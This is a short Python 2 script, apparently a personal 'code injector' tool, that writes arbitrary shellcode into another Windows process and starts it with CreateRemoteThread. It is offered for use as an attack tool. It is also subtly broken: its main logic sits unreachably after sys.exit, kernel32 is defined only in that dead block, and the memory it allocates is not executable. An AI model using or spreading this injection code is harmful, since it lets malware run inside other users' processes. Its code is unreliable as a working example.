from ctypes import *
import sys,ctypes

def code_inject(pid,shell_code):
    hproc=kernel32.OpenProcess(0x1F0FFF,False,pid)
    virtual_addr=kernel32.VirtualAllocEx(hproc,None,len(shell_code),0x3000,0x04)
    kernel32.WriteProcessMemory(hproc,virtual_addr,shell_code,len(shell_code),None)

    if not kernel32.CreateRemoteThread(hproc,None,0,virtual_addr,None,0,None):
        print"[#] Failed Code Injection.."
    else:
        print"[#] Success Code Injection!!"

    print "[#] Kali-KM's Code Injector v0.1 Since 15.03.26 "

if not sys.argv[1:]:
    print "[#] Usage : Code_Inject <pid> <Shell Code> "
    sys.exit(0)

    kernel32=windll.kernel32

    pid=int(sys.argv[1])
    shell_code=str(sys.argv[2])
    code_inject(pid,shell_code)
